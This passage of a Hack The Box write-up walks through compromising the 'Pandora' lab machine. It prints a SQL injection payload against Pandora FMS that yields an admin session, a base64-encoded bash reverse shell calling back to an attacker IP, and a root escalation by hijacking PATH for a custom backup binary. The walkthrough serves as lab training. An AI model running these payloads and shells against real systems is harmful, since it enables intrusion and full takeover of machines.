so maybe we could replace it with some of these dumped sessions? Let's see.  
But this failed :/  

Next I spent alot of time searching for vulnerabilties and I found something interesting and it was on this  
github link:  
> https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py

Here I found a payload that looked like this:  
`/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO`

So basically this should have us logged in as admin but for me It just had a blank page  
but if you look at the storage in firefox's section for cookies there is `PHPSESSID` with admin's  
token so I refreshed the page but nothing but after a bit of trying out these sessions I successfully  
managed to log in and only thing I had to do is navigate to the `/pandora_console/` and with `PHPSESSID`  
already modified we are now an admin.  

[![Capture.png](https://i.postimg.cc/RFVX513y/Capture.png)](https://postimg.cc/67gdCvff)

# Reverse Shell  

Next up I found an exploit for authenticated reverse shell.  
Only thing we need is credentials but luckily we can chnage admin's password on his profile.  

[![Capture.png](https://i.postimg.cc/Xv86k8Sz/Capture.png)](https://postimg.cc/bGs5z1vx)

This sript wants us to supply credentials and reverse shell script.  
I am going to use pentesmonkey's php reverse shell which you can get from here: 
> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

and we need to modify the php revere shell like so:  

```bash

...[SNIP]...

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.2';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0; 
$debug = 0;

...[SNIP]...

```

Start a listener on specified port.  

```bash
┌──(herc㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
```

AAAAAHHHH... it didn't work................  
Okay so from what I gathered we can upload files and execute a reverse shell so  
if this exploit is not working I am going to try manually with uploading a web shell to  
`Tools > File repository` and see if it is working.
You can get the web-shell from here:  
> https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985#file-easy-simple-php-webshell-php

And still  doesn't work...
Okay more searching and testing.  

Eventually I find another exploit that does pretty much everything we needed so let's give it a try:  
> https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated


#Shell as matt

And finally we got a shell

```bash
┌──(herc㉿kali)-[/CTF/HTB/Pandora]
└─$ python3 sqlpwn.py -t 127.0.0.1:80
URL:  http://127.0.0.1:80/pandora_console
[+] Sending Injection Payload
[+] Requesting Session
[+] Admin Session Cookie : gas8r2jaf60vroiq3a2a3tbm1q
[+] Sending Payload 
[+] Respose : 200
[+] Pwned :)
[+] If you want manual Control : http://127.0.0.1:80/pandora_console/images/pwn.php?test=
CMD > whoami
matt

CMD >
```

next I am going to get a better reverse shell and upgrade it.  
To do that first I will use basic bash reverse shell and encode it to base64.  

```bash
┌──(herc㉿kali)-[~]
└─$ `echo -n "bash -i  >& /dev/tcp/10.10.14.2/4444  0>&1" | base64`
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0ICAwPiYx
```

Execute it on prevous shell  

```bash
CMD > `echo -n "YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0ICAwPiYx" | base64 -d | bash`
```

And finally a great success  

```bash
┌──(herc㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.136] 40092
bash: cannot set terminal process group (890): Inappropriate ioctl for device
bash: no job control in this shell
matt@pandora:/var/www/pandora/pandora_console/images$
```

# Privilege Escalation X2

I ran LinEnum.sh on the box which you can get from here:  
> https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

And script found an SUID binary which we might be able to escalate privileges with.  

```bash
...[SNIP]...

[-] SUID files:
-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec
-rwsr-xr-x 1 root root 85064 Jul 14  2021 /usr/bin/chfn
-rwsr-xr-x 1 root root 44784 Jul 14  2021 /usr/bin/newgrp
-rwsr-xr-x 1 root root 88464 Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39144 Jul 21  2020 /usr/bin/umount
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
-rwsr-xr-x 1 root root 68208 Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x 1 root root 55528 Jul 21  2020 /usr/bin/mount
-rwsr-xr-x 1 root root 67816 Jul 21  2020 /usr/bin/su
`-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at`
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 53040 Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1

...[SNIP]...
```

we can see that `at` is kinda poking out and since I forgot to show that we are in restricted environment  
I am going to show it to you now.  
So when we run `sudo -l` to see what can we run as root we get this:  

```bash
matt@pandora:/tmp$ sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
```

Which is a good indication that we are in restricted environment and with `at`  
being SUID binary we can search on `gtfobins` for some kind of escalation.  
Looking at gtfobins we can see that we can use it to escape restricted environments:  

[![Capture.png](https://i.postimg.cc/K8kQr7wD/Capture.png)](https://postimg.cc/9D2Gc9WD)

# Root

A second command that seemed interesting was: "pandora_backup".  
Indeed a custom script and therefore with potential flaws.
I noticed that the tar command is used to compress files in the root folder.  
But the call to tar does not use the full path, so we will be able to change the $PATH  
for a custom executable allowing us a privilege elevation.  

For that I create a "tar" file in the "tmp" folder,  
then I put the command /bin/sh inside. After adding the permissions  
on the file I can run the script:  

```bash
matt@pandora:/$ `cd /tmp && echo "/bin/sh" > tar && chmod 777 tar`
matt@pandora:/tmp$ `export PATH=/tmp:$PATH`
matt@pandora:/tmp$ `pandora_backup`
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
#
```

And just like this I am finally root:  

```bash
# id
id
uid=0(root) gid=1000(matt) groups=1000(matt)
# whoami
whoami
root
```

Finally after a couple of hours I was able to finish this box.  
In my opinion this was a lot of hard box comapred to the rest of the "easy"  
machines on HackTheBox but I learned alot on it and hoep you did too.  

Thanks for reading! <3
